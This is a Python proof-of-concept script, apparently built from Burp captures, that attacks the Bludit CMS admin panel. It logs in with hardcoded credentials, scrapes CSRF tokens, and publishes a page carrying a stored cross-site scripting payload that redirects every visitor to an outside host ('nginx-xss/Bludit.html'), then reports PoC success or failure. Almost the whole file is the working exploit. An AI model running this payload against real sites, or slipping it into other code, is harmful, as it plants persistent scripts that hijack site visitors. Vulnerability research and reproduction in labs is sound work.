import requests
#from requests_toolbelt.multipart.encoder import MultipartEncoder
import re
import sys
import time


def login(host):
    session = requests.session()
    burp0_url = "http://"+host+"/admin/"
    r=session.get(burp0_url)
    txt=r.text
    #print(txt)
    token=re.search('"tokenCSRF" value=\"(.*?)\">', txt, re.DOTALL).group(1)
    #print(token)
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://"+host+"", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://"+host+"/admin/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = {"tokenCSRF": token, "username": "user", "password": "123456", "save": ''}
    r=session.post(burp0_url, headers=burp0_headers,  data=burp0_data)
    html_set_cookie = requests.utils.dict_from_cookiejar(session.cookies)
    #print(html_set_cookie)

    
    burp0_url = "http://"+host+"/admin/edit-user/user"
    burp0_cookies = html_set_cookie
    rest=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    txt=rest.text
    token=re.search('"tokenCSRF" value=\"(.*?)\">', txt, re.DOTALL).group(1)
    print(token)




    burp0_url = "http://"+host+"/admin/new-content"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://"+host+"", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://"+host+"/admin/new-content", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    txt=r.text
    uuid=re.search('"uuid" value=\"(.*?)\">', txt, re.DOTALL).group(1)
    token=re.search('"tokenCSRF" value=\"(.*?)\">', txt, re.DOTALL).group(1)

   
 
    burp0_data = {"tokenCSRF": token, "uuid": uuid, "type": "published", "coverImage": '', "content": "<p>1</p>\r\n<p>\r\n<script>window.location.href=\"http://nginx-xss/Bludit.html\"</script>\r\n</p>", "category": '', "description": '', "date": "2020-10-02 10:56:03", "typeSelector": "published", "position": "3", "tags": '', "template": '', "externalCoverImage": '', "slug": "cuc", "noindex": "0", "nofollow": "0", "noarchive": "0", "title": "cuc"}
    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    print(r.text)
def check(ck1,ck2):
    if  ck1==200 and ck2==200:
        print('PoC success!')
        return 0
    else:
        print('PoC fail!')
        return -1

if __name__ == "__main__":
   
    host =sys.argv[1]
#host="192.168.56.101:8000"
   # path = '.'
    # ck=login(host)
    # ck1=ck[0]
    # ck2=ck[1]

    # check(ck1,ck2)
    login(host)